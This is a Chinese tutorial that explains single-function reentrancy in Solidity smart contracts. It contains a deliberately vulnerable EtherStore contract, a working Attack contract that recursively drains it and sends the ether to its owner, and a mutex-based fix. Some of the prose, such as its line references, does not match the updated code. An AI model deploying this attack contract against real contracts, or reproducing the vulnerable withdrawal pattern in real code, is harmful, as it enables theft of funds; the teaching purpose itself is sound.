#  重入攻击

重入攻击（Reentrancy Attack）应该是Solidity中最常见的攻击类型了，原理其实就是借助漏洞合约对外部合约的过度信任以及漏洞合约内部变量变化前的滞留来对漏洞合约进行攻击的，它的变种也有很多，比如跨函数重入、跨链重入、只读重入等，这里就只介绍最基础的单函数重入

## 1. 单函数重入的简单例子

这里举一个例子，假如我们有个EtherStore合约，允许往里面存钱的用户每周最多提款1ether：

```solidity
// This code has been syntax-upgraded to ^0.8.0 by me, original post at https://betterprogramming.pub/preventing-smart-contract-attacks-on-ethereum-a-code-analysis-bf95519b403a

contract EtherStore {

    uint256 public withdrawalLimit = 1 ether;
    mapping(address => uint256) public lastWithdrawTime;
    mapping(address => uint256) public balances;

    function depositFunds() external payable {
        balances[msg.sender] += msg.value;
    }

    function withdrawFunds (uint256 _weiToWithdraw) public{
        unchecked{
        require(balances[msg.sender] >= _weiToWithdraw,"1");
        // limit the withdrawal
        require(_weiToWithdraw <= withdrawalLimit,"2");
        // limit the time allowed to withdraw
        require(block.timestamp >= lastWithdrawTime[msg.sender] + 1 weeks,"3");
        (bool success,) = msg.sender.call{value: _weiToWithdraw}("");
        require(success,"4");
        balances[msg.sender] -= _weiToWithdraw;
        lastWithdrawTime[msg.sender] = block.timestamp;
        }
    }
 }
```

要求一周内没有提过款，且提款金额也被限制的很好，看起来无懈可击，不是吗？

但是如果我告诉你漏洞在第17行的`msg.sender.call.value(_weiToWithdraw)()`呢？

我们来看攻击合约：

```solidity
// This code has been syntax-upgraded to ^0.8.0 and slightly modified by me, original post at https://betterprogramming.pub/preventing-smart-contract-attacks-on-ethereum-a-code-analysis-bf95519b403a

contract Attack {
  EtherStore public etherStore;
  address public owner;

  // intialize the etherStore variable with the contract address
  constructor(address _etherStoreAddress) {
      etherStore = EtherStore(_etherStoreAddress);
      owner = msg.sender;
  }

  function attackEtherStore() external payable {
      // attack to the nearest ether
      require(msg.value >= 1 ether);
      // send eth to the depositFunds() function
      etherStore.depositFunds{value: 1 ether}();
      // start the magic
      etherStore.withdrawFunds(1 ether);
  }

  // fallback function - where the magic happens

  receive() external payable{
      if (address(etherStore).balance > 1 ether) {
        etherStore.withdrawFunds(1 ether);
      }
      else{
        payable(owner).transfer(address(this).balance);
        return;
      }
  }
}
```

直接这样看我们可能不太能理解，那就让我们分析一下代码的执行路径吧：

首先，向EtherStore存款（下文简称ES），为接下来的提款铺路，然后就开始向ES提款

第1次，所有条件都满足，我们直接跳过，来到漏洞处，此时ES向攻击合约发送1ether，而攻击合约因为没有`receive()`，因此调用了fallback函数，而fallback中我们又向ES发起提款（注意第1次的提款代码执行还在第17行）

第2次，由于第1次的代码执行还在第17行，所以攻击合约的余额没变，上次提款时间也是没变的，所以攻击合约依旧满足所有条件. 判断完之后又到了第17行，ES向攻击合约发送1ether

...以此类推，等到ES合约只剩下小于或等于1ether的时候，攻击合约的fallback不执行了，这个时候最后一次的提款继续走到ES的第18和19行，然后是次最后一次的，以此类推一直到第1次的提款结束，此时我们攻击合约的余额和最近一次提款时间被确定，攻击结束

最后我们看结果：我们的攻击合约提取了ES合约里面近乎所有的ether，除了剩下来的那一个或者一个不到

##  2. 简单的预防措施

那么我们如何预防呢？其实很简单，我们在转账的时候锁住函数就好了，比如说下面修改后的ES合约：

```solidity
// This code has been syntax-upgraded to ^0.8.0 by me, original post at https://betterprogramming.pub/preventing-smart-contract-attacks-on-ethereum-a-code-analysis-bf95519b403a

contract EtherStore {

    // initialize the mutex
    bool reEntrancyMutex = false;
    uint256 public withdrawalLimit = 1 ether;
    mapping(address => uint256) public lastWithdrawTime;
    mapping(address => uint256) public balances;

    function depositFunds() external payable {
        balances[msg.sender] += msg.value;
    }

    function withdrawFunds (uint256 _weiToWithdraw) public payable{
        require(!reEntrancyMutex);
        require(balances[msg.sender] >= _weiToWithdraw);
        // limit the withdrawal
        require(_weiToWithdraw <= withdrawalLimit);
        // limit the time allowed to withdraw
        require(block.timestamp >= lastWithdrawTime[msg.sender] + 1 weeks);
        balances[msg.sender] -= _weiToWithdraw;
        lastWithdrawTime[msg.sender] = block.timestamp;
        // set the reEntrancy mutex before the external call
        reEntrancyMutex = true;
        payable(msg.sender).transfer(_weiToWithdraw);
        // release the mutex after the external call
        reEntrancyMutex = false;
    }
 }
```

我们添加了一个reEntrancyMutex（其实就是个哨兵），而且我们提前修改了被转账者的余额和上次提款时间，双倍保险

> 需要注意的是，重入攻击主要借助的是漏洞合约有意或无意中使得攻击合约能在交易中途执行代码，且此时漏洞合约的部分变量未及时更新，ETH转账只是其中的一种途径，视情况可能还存在其它的途径